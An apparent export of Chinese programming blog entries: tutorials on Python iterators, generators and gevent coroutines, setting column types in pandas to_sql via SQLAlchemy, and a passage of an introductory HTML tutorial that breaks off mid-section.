迭代器Iterator通过上面的分析，我们已经知道，迭代器是用来帮助我们记录每次迭代访问到的位置，当我们对迭代器使用next()函数的时候，迭代器会向我们返回它所记录位置的下一个位置的数据。实际上，在使用next()函数的时候，调用的就是迭代器对象的__next__方法（Python3中是对象的__next__方法，Python2中是对象的next()方法）。所以，我们要想构造一个迭代器，就要实现它的next方法。但这还不够，python要求迭代器本身也是可迭代的，所以我们还要为迭代器实现__iter__方法，而__iter__方法要返回一个迭代器，迭代器自身正是一个迭代器，所以迭代器的__iter__方法返回自身即可。一个实现了iter方法和next方法的对象，就是迭代器。1234567891011121314151617181920212223242526272829303132333435363738394041class MyList(object): """自定义的一个可迭代对象""" def __init__(self): self.items = [] def add(self, val): self.items.append(val) def __iter__(self): myiterator = MyIterator(self) return myiteratorclass MyIterator(object): """自定义的供上面可迭代对象使用的一个迭代器""" def __init__(self, mylist): self.mylist = mylist # current用来记录当前访问到的位置 self.current = 0 def __next__(self): if self.current &lt; len(self.mylist.items): item = self.mylist.items[self.current] self.current += 1 return item else: raise StopIteration def __iter__(self): return selfif __name__ == '__main__': mylist = MyList() mylist.add(1) mylist.add(2) mylist.add(3) mylist.add(4) mylist.add(5) for num in mylist: print(num)7. for…in…循环的本质for item in Iterable 循环的本质就是先通过iter()函数获取可迭代对象Iterable的迭代器，然后对获取到的迭代器不断调用next()方法来获取下一个值并将其赋值给item，当遇到StopIteration的异常后循环结束。8. 迭代器的应用场景我们发现迭代器最核心的功能就是可以通过next()函数的调用来返回下一个数据值。如果每次返回的数据值不是在一个已有的数据集合中读取的，而是通过程序按照一定的规律计算生成的，那么也就意味着可以不用再依赖一个已有的数据集合，也就是说不用再将所有要迭代的数据都一次性缓存下来供后续依次读取，这样可以节省大量的存储（内存）空间。举个例子，比如，数学中有个著名的斐波拉契数列（Fibonacci），数列中第一个数为0，第二个数为1，其后的每一个数都可由前两个数相加得到：0, 1, 1, 2, 3, 5, 8, 13, 21, 34, …现在我们想要通过for…in…循环来遍历迭代斐波那契数列中的前n个数。那么这个斐波那契数列我们就可以用迭代器来实现，每次迭代都通过数学计算来生成下一个数。123456789101112131415161718192021222324252627282930313233class FibIterator(object): """斐波那契数列迭代器""" def __init__(self, n): """ :param n: int, 指明生成数列的前n个数 """ self.n = n # current用来保存当前生成到数列中的第几个数了 self.current = 0 # num1用来保存前前一个数，初始值为数列中的第一个数0 self.num1 = 0 # num2用来保存前一个数，初始值为数列中的第二个数1 self.num2 = 1 def __next__(self): """被next()函数调用来获取下一个数""" if self.current &lt; self.n: num = self.num1 self.num1, self.num2 = self.num2, self.num1+self.num2 self.current += 1 return num else: raise StopIteration def __iter__(self): """迭代器的__iter__返回自身即可""" return selfif __name__ == '__main__': fib = FibIterator(10) for num in fib: print(num, end=" ")9. 并不是只有for循环能接收可迭代对象除了for循环能接收可迭代对象，list、tuple等也能接收。1234li = list(FibIterator(15))print(li)tp = tuple(FibIterator(6))print(tp)生成器1. 生成器利用迭代器，我们可以在每次迭代获取数据（通过next()方法）时按照特定的规律进行生成。但是我们在实现一个迭代器时，关于当前迭代到的状态需要我们自己记录，进而才能根据当前状态生成下一个数据。为了达到记录当前状态，并配合next()函数进行迭代使用，我们可以采用更简便的语法，即生成器(generator)。生成器是一类特殊的迭代器。2. 创建生成器方法1要创建一个生成器，有很多种方法。第一种方法很简单，只要把一个列表生成式的 [ ] 改成 ( )1234567891011In [15]: L = [ x*2 for x in range(5)]In [16]: LOut[16]: [0, 2, 4, 6, 8]In [17]: G = ( x*2 for x in range(5))In [18]: GOut[18]: &lt;generator object &lt;genexpr&gt; at 0x7f626c132db0&gt;In [19]:创建 L 和 G 的区别仅在于最外层的 [ ] 和 ( ) ， L 是一个列表，而 G 是一个生成器。我们可以直接打印出列表L的每一个元素，而对于生成器G，我们可以按照迭代器的使用方法来使用，即可以通过next()函数、for循环、list()等方法使用。123456789101112131415161718192021222324252627282930313233343536In [19]: next(G)Out[19]: 0In [20]: next(G)Out[20]: 2In [21]: next(G)Out[21]: 4In [22]: next(G)Out[22]: 6In [23]: next(G)Out[23]: 8In [24]: next(G)---------------------------------------------------------------------------StopIteration Traceback (most recent call last)&lt;ipython-input-24-380e167d6934&gt; in &lt;module&gt;()----&gt; 1 next(G)StopIteration:In [25]:In [26]: G = ( x*2 for x in range(5))In [27]: for x in G: ....: print(x) ....: 02468In [28]:3. 创建生成器方法2generator非常强大。如果推算的算法比较复杂，用类似列表生成式的 for 循环无法实现的时候，还可以用函数来实现。我们仍然用上一节提到的斐波那契数列来举例，回想我们在上一节用迭代器的实现方式：123456789101112131415161718192021222324252627class FibIterator(object): """斐波那契数列迭代器""" def __init__(self, n): """ :param n: int, 指明生成数列的前n个数 """ self.n = n # current用来保存当前生成到数列中的第几个数了 self.current = 0 # num1用来保存前前一个数，初始值为数列中的第一个数0 self.num1 = 0 # num2用来保存前一个数，初始值为数列中的第二个数1 self.num2 = 1 def __next__(self): """被next()函数调用来获取下一个数""" if self.current &lt; self.n: num = self.num1 self.num1, self.num2 = self.num2, self.num1+self.num2 self.current += 1 return num else: raise StopIteration def __iter__(self): """迭代器的__iter__返回自身即可""" return self注意，在用迭代器实现的方式中，我们要借助几个变量(n、current、num1、num2)来保存迭代的状态。现在我们用生成器来实现一下。1234567891011121314151617181920212223242526272829303132333435In [30]: def fib(n): ....: current = 0 ....: num1, num2 = 0, 1 ....: while current &lt; n: ....: num = num1 ....: num1, num2 = num2, num1+num2 ....: current += 1 ....: yield num ....: return 'done' ....:In [31]: F = fib(5)In [32]: next(F)Out[32]: 1In [33]: next(F)Out[33]: 1In [34]: next(F)Out[34]: 2In [35]: next(F)Out[35]: 3In [36]: next(F)Out[36]: 5In [37]: next(F)---------------------------------------------------------------------------StopIteration Traceback (most recent call last)&lt;ipython-input-37-8c2b02b4361a&gt; in &lt;module&gt;()----&gt; 1 next(F)StopIteration: done在使用生成器实现的方式中，我们将原本在迭代器__next__方法中实现的基本逻辑放到一个函数中来实现，但是将每次迭代返回数值的return换成了yield，此时新定义的函数便不再是函数，而是一个生成器了。简单来说：只要在def函数中有yield关键字的 就称为 生成器此时按照调用函数的方式( 案例中为F = fib(5) )使用生成器就不再是执行函数体了，而是会返回一个生成器对象（ 案例中为F ），然后就可以按照使用迭代器的方式来使用生成器了。12345678910In [38]: for n in fib(5): ....: print(n) ....: 11235In [39]:但是用for循环调用generator时，发现拿不到generator的return语句的返回值。如果想要拿到返回值，必须捕获StopIteration错误，返回值包含在StopIteration的value中：123456789101112131415161718In [39]: g = fib(5)In [40]: while True: ....: try: ....: x = next(g) ....: print("value:%d"%x) ....: except StopIteration as e: ....: print("生成器返回值:%s"%e.value) ....: break ....: value:1value:1value:2value:3value:5生成器返回值:doneIn [41]:总结使用了yield关键字的函数不再是函数，而是生成器。（使用了yield的函数就是生成器）yield关键字有两点作用：保存当前运行状态（断点），然后暂停执行，即将生成器（函数）挂起将yield关键字后面表达式的值作为返回值返回，此时可以理解为起到了return的作用可以使用next()函数让生成器从断点处继续执行，即唤醒生成器（函数）Python3中的生成器可以使用return返回最终运行的返回值，而Python2中的生成器不允许使用return返回一个返回值（即可以使用return从生成器中退出，但return后不能有任何表达式）。4. 使用send唤醒我们除了可以使用next()函数来唤醒生成器继续执行外，还可以使用send()函数来唤醒执行。使用send()函数的一个好处是可以在唤醒的同时向断点处传入一个附加数据。例子：执行到yield时，gen函数作用暂时保存，返回i的值; temp接收下次c.send(“python”)，send发送过来的值，c.next()等价c.send(None)1234567In [10]: def gen(): ....: i = 0 ....: while i&lt;5: ....: temp = yield i ....: print(temp) ....: i+=1 ....:使用send123456789101112131415161718In [43]: f = gen()In [44]: next(f)Out[44]: 0In [45]: f.send('haha')hahaOut[45]: 1In [46]: next(f)NoneOut[46]: 2In [47]: f.send('haha')hahaOut[47]: 3In [48]:使用next函数1234567891011121314151617181920212223242526272829In [11]: f = gen()In [12]: next(f)Out[12]: 0In [13]: next(f)NoneOut[13]: 1In [14]: next(f)NoneOut[14]: 2In [15]: next(f)NoneOut[15]: 3In [16]: next(f)NoneOut[16]: 4In [17]: next(f)None---------------------------------------------------------------------------StopIteration Traceback (most recent call last)&lt;ipython-input-17-468f0afdf1b9&gt; in &lt;module&gt;()----&gt; 1 next(f)StopIteration:使用__next__()方法（不常使用）1234567891011121314151617181920212223242526272829In [18]: f = gen()In [19]: f.__next__()Out[19]: 0In [20]: f.__next__()NoneOut[20]: 1In [21]: f.__next__()NoneOut[21]: 2In [22]: f.__next__()NoneOut[22]: 3In [23]: f.__next__()NoneOut[23]: 4In [24]: f.__next__()None---------------------------------------------------------------------------StopIteration Traceback (most recent call last)&lt;ipython-input-24-39ec527346a9&gt; in &lt;module&gt;()----&gt; 1 f.__next__()StopIteration:协程协程，又称微线程，纤程。英文名Coroutine。1.协程是啥协程是python个中另外一种实现多任务的方式，只不过比线程更小占用更小执行单元（理解为需要的资源）。 为啥说它是一个执行单元，因为它自带CPU上下文。这样只要在合适的时机， 我们可以把一个协程 切换到另一个协程。 只要这个过程中保存或恢复 CPU上下文那么程序还是可以运行的。通俗的理解：在一个线程中的某个函数，可以在任何地方保存当前函数的一些临时变量等信息，然后切换到另外一个函数中执行，注意不是通过调用函数的方式做到的，并且切换的次数以及什么时候再切换到原来的函数都由开发者自己确定2.协程和线程差异在实现多任务时, 线程切换从系统层面远不止保存和恢复 CPU上下文这么简单。 操作系统为了程序运行的高效性每个线程都有自己缓存Cache等等数据，操作系统还会帮你做这些数据的恢复操作。 所以线程的切换非常耗性能。但是协程的切换只是单纯的操作CPU的上下文，所以一秒钟切换个上百万次系统都抗的住。3.简单实现协程1234567891011121314151617181920212223import timedef work1(): while True: print("----work1---") yield time.sleep(0.5)def work2(): while True: print("----work2---") yield time.sleep(0.5)def main(): w1 = work1() w2 = work2() while True: next(w1) next(w2)if __name__ == "__main__": main()运行结果：12345678910111213----work1-------work2-------work1-------work2-------work1-------work2-------work1-------work2-------work1-------work2-------work1-------work2---...省略...greenlet为了更好使用协程来完成多任务，python中的greenlet模块对其封装，从而使得切换任务变的更加简单安装方式使用如下命令安装greenlet模块:1234567891011121314151617181920212223sudo pip3 install greenlet#coding=utf-8from greenlet import greenletimport timedef test1(): while True: print &quot;---A--&quot; gr2.switch() time.sleep(0.5)def test2(): while True: print &quot;---B--&quot; gr1.switch() time.sleep(0.5)gr1 = greenlet(test1)gr2 = greenlet(test2)#切换到gr1中运行gr1.switch()运行效果123456789---A-----B-----A-----B-----A-----B-----A-----B--...省略...geventgreenlet已经实现了协程，但是这个还的人工切换，是不是觉得太麻烦了，不要捉急，python还有一个比greenlet更强大的并且能够自动切换任务的模块gevent其原理是当一个greenlet遇到IO(指的是input output 输入输出，比如网络、文件操作等)操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO安装1pip3 install gevent1. gevent的使用123456789101112import geventdef f(n): for i in range(n): print(gevent.getcurrent(), i)g1 = gevent.spawn(f, 5)g2 = gevent.spawn(f, 5)g3 = gevent.spawn(f, 5)g1.join()g2.join()g3.join()运行结果123456789101112131415&lt;Greenlet at 0x10e49f550: f(5)&gt; 0&lt;Greenlet at 0x10e49f550: f(5)&gt; 1&lt;Greenlet at 0x10e49f550: f(5)&gt; 2&lt;Greenlet at 0x10e49f550: f(5)&gt; 3&lt;Greenlet at 0x10e49f550: f(5)&gt; 4&lt;Greenlet at 0x10e49f910: f(5)&gt; 0&lt;Greenlet at 0x10e49f910: f(5)&gt; 1&lt;Greenlet at 0x10e49f910: f(5)&gt; 2&lt;Greenlet at 0x10e49f910: f(5)&gt; 3&lt;Greenlet at 0x10e49f910: f(5)&gt; 4&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 0&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 1&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 2&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 3&lt;Greenlet at 0x10e49f4b0: f(5)&gt; 4可以看到，3个greenlet是依次运行而不是交替运行2. gevent切换执行1234567891011121314import geventdef f(n): for i in range(n): print(gevent.getcurrent(), i) #用来模拟一个耗时操作，注意不是time模块中的sleep gevent.sleep(1)g1 = gevent.spawn(f, 5)g2 = gevent.spawn(f, 5)g3 = gevent.spawn(f, 5)g1.join()g2.join()g3.join()运行结果123456789101112131415&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 0&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 1&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 2&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 3&lt;Greenlet at 0x7fa70ffa1c30: f(5)&gt; 4&lt;Greenlet at 0x7fa70ffa1870: f(5)&gt; 4&lt;Greenlet at 0x7fa70ffa1eb0: f(5)&gt; 43. 给程序打补丁1234567891011121314from gevent import monkeyimport geventimport randomimport timedef coroutine_work(coroutine_name): for i in range(10): print(coroutine_name, i) time.sleep(random.random())gevent.joinall([ gevent.spawn(coroutine_work, "work1"), gevent.spawn(coroutine_work, "work2")])运行结果1234567891011121314151617181920work1 0work1 1work1 2work1 3work1 4work1 5work1 6work1 7work1 8work1 9work2 0work2 1work2 2work2 3work2 4work2 5work2 6work2 7work2 8work2 91234567891011121314151617from gevent import monkeyimport geventimport randomimport time# 有耗时操作时需要monkey.patch_all() # 将程序中用到的耗时操作的代码，换为gevent中自己实现的模块def coroutine_work(coroutine_name): for i in range(10): print(coroutine_name, i) time.sleep(random.random())gevent.joinall([ gevent.spawn(coroutine_work, &quot;work1&quot;), gevent.spawn(coroutine_work, &quot;work2&quot;)])运行结果1234567891011121314151617181920work1 0work2 0work1 1work1 2work1 3work2 1work1 4work2 2work1 5work2 3work1 6work1 7work1 8work2 4work2 5work1 9work2 6work2 7work2 8work2 9进程、线程、协程对比1.请仔细理解如下的通俗描述有一个老板想要开个工厂进行生产某件商品（例如剪子）他需要花一些财力物力制作一条生产线，这个生产线上有很多的器件以及材料这些所有的 为了能够生产剪子而准备的资源称之为：进程只有生产线是不能够进行生产的，所以老板的找个工人来进行生产，这个工人能够利用这些材料最终一步步的将剪子做出来，这个来做事情的工人称之为：线程这个老板为了提高生产率，想到3种办法：在这条生产线上多招些工人，一起来做剪子，这样效率是成倍増长，即单进程 多线程方式老板发现这条生产线上的工人不是越多越好，因为一条生产线的资源以及材料毕竟有限，所以老板又花了些财力物力购置了另外一条生产线，然后再招些工人这样效率又再一步提高了，即多进程 多线程方式老板发现，现在已经有了很多条生产线，并且每条生产线上已经有很多工人了（即程序是多进程的，每个进程中又有多个线程），为了再次提高效率，老板想了个损招，规定：如果某个员工在上班时临时没事或者再等待某些条件（比如等待另一个工人生产完谋道工序 之后他才能再次工作） ，那么这个员工就利用这个时间去做其它的事情，那么也就是说：如果一个线程等待某些条件，可以充分利用这个时间去做其它事情，其实这就是：协程方式2.简单总结进程是资源分配的单位线程是操作系统调度的单位进程切换需要的资源很最大，效率很低线程切换需要的资源一般，效率一般（当然了在不考虑GIL的情况下）协程切换任务资源很小，效率高多进程、多线程根据cpu核数不一样可能是并行的，但是协程是在一个线程中 所以是并发并发下载器1.并发下载原理123456789101112131415161718from gevent import monkeyimport geventimport urllib.request# 有耗时操作时需要monkey.patch_all()def my_downLoad(url): print('GET: %s' % url) resp = urllib.request.urlopen(url) data = resp.read() print('%d bytes received from %s.' % (len(data), url))gevent.joinall([ gevent.spawn(my_downLoad, 'http://www.baidu.com/'), gevent.spawn(my_downLoad, 'http://www.itcast.cn/'), gevent.spawn(my_downLoad, 'http://www.itheima.com/'),])运行结果123456GET: http://www.baidu.com/GET: http://www.itcast.cn/GET: http://www.itheima.com/111327 bytes received from http://www.baidu.com/.172054 bytes received from http://www.itheima.com/.215035 bytes received from http://www.itcast.cn/.从上能够看到是先发送的获取baidu的相关信息，然后依次是itcast、itheima，但是收到数据的先后顺序不一定与发送顺序相同，这也就体现出了异步，即不确定什么时候会收到数据，顺序不一定2.实现多个视频下载123456789101112131415161718192021from gevent import monkeyimport geventimport urllib.request#有IO才做时需要这一句monkey.patch_all()def my_downLoad(file_name, url): print('GET: %s' % url) resp = urllib.request.urlopen(url) data = resp.read() with open(file_name, "wb") as f: f.write(data) print('%d bytes received from %s.' % (len(data), url))gevent.joinall([ gevent.spawn(my_downLoad, "1.mp4", 'http://oo52bgdsl.bkt.clouddn.com/05day-08-%E3%80%90%E7%90%86%E8%A7%A3%E3%80%91%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89.mp4'), gevent.spawn(my_downLoad, "2.mp4", 'http://oo52bgdsl.bkt.clouddn.com/05day-03-%E3%80%90%E6%8E%8C%E6%8F%A1%E3%80%91%E6%97%A0%E5%8F%82%E6%95%B0%E6%97%A0%E8%BF%94%E5%9B%9E%E5%80%BC%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9A%E4%B9%89%E3%80%81%E8%B0%83%E7%94%A8%28%E4%B8%8B%29.mp4'),])上面的url可以换为自己需要下载视频、音乐、图片等网址]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在pandas.DataFrame.to_sql时指定数据库表的列类型]]></title>
    <url>%2F2019%2F12%2F31%2F%E5%9C%A8pandas.DataFrame.to_sql%E6%97%B6%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%9A%84%E5%88%97%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[该文章转载自以下链接：https://www.jianshu.com/p/4c5e1ebe8470?utm_source=oschina-app问题在数据分析并存储到数据库时，Python的Pandas包提供了to_sql 方法使存储的过程更为便捷，但如果在使用to_sql方法前不在数据库建好相对应的表，to_sql则会默认为你创建一个新表，这时新表的列类型可能并不是你期望的。例如我们通过下段代码往数据库中插入一部分数据：123456import pandas as pdfrom datetime import datetimedf = pd.DataFrame([['a', 1, 1, 2.0, datetime.now(), True]], columns=['str', 'int', 'float', 'datetime', 'boolean'])print(df.dtypes)通过dtypes可知数据类型为object, int64, float64, datetime64[ns], bool 如果把数据通过to_sql方法插入到数据库中：12345from sqlalchemy import create_engineengine = create_engine("mysql+mysqldb://&#123;&#125;:&#123;&#125;@&#123;&#125;/&#123;&#125;".format('username', 'password', 'host:port', 'database'))con = engine.connect()df.to_sql(name='test', con=con, if_exists='append', index=False)用MySQL的desc可以发现数据库自动创建了表并默认指定了列的格式：12# 在MySQL中查看表的列类型desc test;FiledTypeNullKeyDefaultExtrastrtextYESNULLintbigint(20)YESNULLfloatdoubleYESNULLdatetimedatetimeYESNULLbooleantinyint(1)YESNULL其中str类型的数据在数据库表中被映射成text，int类型被映射成bigint(20)， float类型被映射成double类型。数据库中的列类型可能并非是我们所期望的格式，但我们又不想在数据插入前手动的创建数据库的表，而更希望根据DataFrame中数据的格式动态地改变数据库中表格式。分析通过查阅pandas.DataFrame.to_sql的api文档[^footnote]，可以通过指定dtype 参数值来改变数据库中创建表的列类型。dtype : dict of column name to SQL type, default NoneOptional specifying the datatype for columns. The SQL type should be a SQLAlchemy type, or a string for sqlite3 fallback connection.根据描述，可以在执行to_sql方法时，将映射好列名和指定类型的dict赋值给dtype参数即可上，其中对于MySQL表的列类型可以使用SQLAlchemy包中封装好的类型。12# 执行前先在MySQL中删除表drop table test;123456789from sqlalchemy.types import NVARCHAR, Float, Integerdtypedict = &#123; 'str': NVARCHAR(length=255), 'int': Integer(), 'float' Float()&#125;df.to_sql(name='test', con=con, if_exists='append', index=False, dtype=dtypedict)更新代码后，再查看数据库，可以看到数据库在建表时会根据dtypedict中的列名来指定相应的类型。12# 在MySQL中查看表的列类型desc test;FiledTypeNullKeyDefaultExtrastrvarchar(255)YESNULLintint(11)YESNULLfloatfloatYESNULLdatetimedatetimeYESNULLbooleantinyint(1)YESNULL答案通过分析，我们已经知道在执行to_sql的方法时，可以通过创建一个类似“{“column_name”：sqlalchemy_type}”的映射结构来控制数据库中表的列类型。但在实际使用时，我们更希望能通过pandas.DataFrame中的column的数据类型来映射数据库中的列类型，而不是每此都要列出pandas.DataFrame的column名字。写一个简单的def将pandas.DataFrame中列名和预指定的类型映射起来即可：12345678910def mapping_df_types(df): dtypedict = &#123;&#125; for i, j in zip(df.columns, df.dtypes): if "object" in str(j): dtypedict.update(&#123;i: NVARCHAR(length=255)&#125;) if "float" in str(j): dtypedict.update(&#123;i: Float(precision=2, asdecimal=True)&#125;) if "int" in str(j): dtypedict.update(&#123;i: Integer()&#125;) return dtypedict只要在执行to_sql前使用此方法获得一个映射dict再赋值给to_sql的dtype参数即可，执行的结果与上一节相同，不再累述。1234df = pd.DataFrame([['a', 1, 1, 2.0, datetime.now(), True]], columns=['str', 'int', 'float', 'datetime', 'boolean'])dtypedict = mapping_df_types(df)df.to_sql(name='test', con=con, if_exists='append', index=False, dtype=dtypedict)参考[^footnote]pandas官方文档]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端知识汇总]]></title>
    <url>%2F2019%2F12%2F31%2F%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[1. 前端开发概述包括html、css、PC端及移动端布局技巧、javascript、jquery、js特效制作、ajax前后台交互等。1.1 什么是前端开发？前端开发也叫做web前端开发，它指的是基于web的互联网产品的页面(也可叫界面)开发及功能开发。1.2 什么互联网产品？互联网产品就是指网站为满足用户需求而创建的用于运营的功能及服务，百度搜索、淘宝、QQ、微博、网易邮箱等都是互联网产品。1.3 互联网产品开发流程及前端开发岗位？1.4 前端开发需要哪些技术？前端工程师参照产品的效果图来开发页面(也可叫界面)，效果图是由UI设计师用Photoshop(少量设计师用firework)来设计的，为了方便与UI设计师对接工作，前端需要掌握一些Photoshop的技能，Photoshop还可以辅助页面开发。把效果图布局成页面，需要用到HTML语言和CSS语言，页面功能的开发需要用到javascript,为了快速开发和系统开发，还需要学习一些前端的javascript库和框架。2. HTML2.1 html概述和基本结构2.1.1 html概述HTML是 HyperText Mark-up Language 的首字母简写，意思是超文本标记语言，超文本指的是超链接，标记指的是标签，是一种用来制作网页的语言，这种语言由一个个的标签组成，用这种语言制作的文件保存的是一个文本文件，文件的扩展名为html或者htm，一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件渲染成网页，显示的网页可以从一个网页链接跳转到另外一个网页。2.1.2 html基本结构一个html的基本结构如下：12345678910&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;网页标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 网页显示内容 &lt;/body&gt;&lt;/html&gt;第一行是文档声明，第二行“”标签和最后一行“”定义html文档的整体，“”标签中的‘lang=“en”’定义网页的语言为英文，定义成中文是’lang=”zh-CN”‘,不定义也没什么影响，它一般作为分析统计用。 “”标签和“”标签是它的第一层子元素，“”标签里面负责对网页进行一些设置以及定义标题，设置包括定义网页的编码格式，外链css样式文件和javascript文件等，设置的内容不会显示在网页上，标题的内容会显示在标题，“”内编写网页上显示的内容。L2Dwidget.init({log:!1,pluginJsPath:"lib/",pluginModelPath:"assets/",pluginRootPath:"live2dw/",tagMode:!1})2.1.3 HTML文档类型目前常用的两种文档类型是xhtml 1.0和html5xhtml 1.0xhtml 1.0 是html5之前的一个常用的版本，目前许多网站仍然使用此版本。此版本文档用sublime text创建方法： html:xt + tab文档示例：12345678910&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt; &lt;title&gt; xhtml 1.0 文档类型 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;html5pc端可以使用xhtml 1.0，也可以使用html5，html5是向下兼容的此版本文档用sublime text创建方法： html:5 + tab 或者 ! + tab文档示例：12345678910&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt; html5文档类型 &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;两种文档的区别1、文档声明和编码声明2、html5新增了标签元素以及元素属性html注释html文档代码中可以插入注释，注释是对代码的说明和解释，注释的内容不会显示在页面上，html代码中插入注释的方法是：1&lt;!-- 这是一段注释 --&gt;2.2 html标题标签通过 &lt;h1&gt;、&lt;h2&gt;、&lt;h3&gt;、&lt;h4&gt;、&lt;h5&gt;、&lt;h6&gt;,标签可以在网页上定义6种级别的标题。6种级别的标题表示文档的6级目录层级关系，比如说： &lt;h1&gt;用作主标题，其后是 &lt;h2&gt;，再其次是 &lt;h3&gt;，以此类推。搜索引擎会使用标题将网页的结构和内容编制索引，所以网页上使用标题是很重要的。123&lt;h1&gt;这是一级标题&lt;/h1&gt;&lt;h2&gt;这是二级标题&lt;/h2&gt;&lt;h3&gt;这是三级标题&lt;/h3&gt;2.3 html段落标签、换行标签与字符实体2.3.1 html段落标签&lt;p&gt;标签定义一个文本段落，一个段落含有默认的上下间距，段落之间会用这种默认间距隔开，代码如下：1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;段落&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;HTML是 HyperText Mark-up Language 的首字母简写，意思是超文本标记语言，超 文本指的是超链接，标记指的是标签，是一种用来制作网页的语言，这种语言由一个个的 标签组成，用这种语言制作的文件保存的是一个文本文件，文件的扩展名为html或者htm。 &lt;/p&gt; &lt;p&gt;一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用文本的方 式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件渲染成网页，显示的网 页可以从一个网页链接跳转到另外一个网页。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;2.3.2 html换行标签代码中成段的文字，直接在代码中回车换行，在渲染成网页时候不认这种换行，如果真想换行，可以在代码的段落中插入&lt;br /&gt;来强制换行，代码如下：12345&lt;p&gt;一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用&lt;br /&gt;文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件&lt;br /&gt;渲染成网页，显示的网页可以从一个网页链接跳转到另外一个网页。&lt;/p&gt;2.3.3 html字符实体代码中成段的文字，如果文字间想空多个空格，在代码中空多个空格，在渲染成网页时只会显示一个空格，如果想显示多个空格，可以使用空格的字符实体,代码如下：12345&lt;!-- 在段落前想缩进两个文字的空格，使用空格的字符实体：&amp;nbsp; --&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;一个html文件就是一个网页，html文件用编辑器打开显示的是文本，可以用&lt;br /&gt;文本的方式编辑它，如果用浏览器打开，浏览器会按照标签描述内容将文件&lt;br /&gt;渲染成网页，显示的网页可以从一个网页链接跳转到另外一个网页。&lt;/p&gt;在网页上显示 “&lt;” 和 “&gt;” 会误认为是标签，想在网页上显示“&lt;”和“&gt;”可以使用它们的字符实体，比如：12345&lt;!-- “&lt;” 和 “&gt;” 的字符实体为 &amp;lt; 和 &amp;gt; --&gt;&lt;p&gt; 3 &amp;lt; 5 &lt;br&gt; 10 &amp;gt; 5&lt;/p&gt;2.4 html块标签、含样式的标签2.4.1 html块标签1、&lt;div&gt; 标签 块元素，表示一块内容，没有任何样式，不表示具体的语义，里面可以嵌套其他标签。2、&lt;span&gt; 标签 行内元素，表示一行中的一小段内容，没有具体的语义。2.4.2 含样式和语义的标签1、&lt;em&gt; 标签 行内元素，表示语气中的强调词2、&lt;i&gt; 标签 行内元素，表示专业词汇3、&lt;b&gt; 标签 行内元素，表示文档中的关键字或者产品名4、&lt;strong&gt; 标签 行内元素，表示非常重要的内容2.4.3 语义化的标签语义化的标签，就是在布局的时候多使用有语义的标签，搜索引擎在爬网的时候能认识这些标签，理解文档的结构，方便网站的收录。比如：h1标签是表示标题，p标签是表示段落，ul、li标签是表示列表，a标签表示链接，dl、dt、dd表示定义列表等，语义化的标签不多。2.5 html图像标签、绝对路径和相对路径2.5.1 html图像标签&lt;img&gt;标签可以在网页上插入一张图片，它是独立使用的标签，它的常用属性有：src属性 定义图片的引用地址alt属性 定义图片加载失败时显示的文字，搜索引擎会使用这个文字收录图片、盲人读屏软件会读取这个文字让盲人识别图片，所以此属性非常重要。1&lt;img src="images/pic.jpg" alt="产品图片" /&gt;2.5.2 